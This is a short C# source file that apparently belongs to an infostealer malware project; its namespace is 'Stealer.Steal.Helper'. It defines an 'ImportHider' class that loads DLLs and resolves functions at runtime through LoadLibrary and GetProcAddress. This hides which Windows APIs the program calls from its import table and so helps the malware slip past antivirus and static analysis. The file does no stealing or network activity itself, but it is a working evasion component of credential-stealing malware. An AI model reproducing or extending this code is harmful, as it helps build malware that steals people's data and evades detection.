using System;
using System.ComponentModel;
using System.Runtime.InteropServices;

namespace Stealer.Steal.Helper;

public class ImportHider
{
	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
	private static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

	public static T HiddenCallResolve<T>(string dllName, string methodName) where T : Delegate
	{
		IntPtr intPtr = LoadLibrary(dllName);
		if (intPtr == IntPtr.Zero)
		{
			throw new Win32Exception(Marshal.GetLastWin32Error());
		}
		return (T)Marshal.GetDelegateForFunctionPointer(GetProcAddress(intPtr, methodName), typeof(T));
	}
}
